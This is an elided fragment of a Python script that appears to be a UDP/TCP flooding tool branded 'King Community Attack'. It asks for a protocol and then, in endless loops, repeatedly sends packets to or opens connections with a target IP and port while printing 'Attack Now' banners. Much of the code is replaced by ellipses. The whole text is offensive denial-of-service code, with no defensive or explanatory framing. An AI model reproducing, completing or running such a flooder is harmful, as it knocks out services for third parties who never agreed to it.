...
choice = str(input("\033[1;36;40m King Community Attack Now (Udp/Tcp) \033[1;31;40m===> "))
  ...
  while True:
        try:
                ...
                for x in range(times):
                        ...
                        s.sendto(data,addr)
                        s.sendto(data,addr)
                print("\033[1;31;40 King Community Attack Now Ip %s Port %s."%(ip,port))
        except:
...
def tcp():
  ...
  while True:
        try:
                ...
                s.close()
                print("\033[1;31;40m King Community Attack Now Ip %s Port %s."%(ip,port))
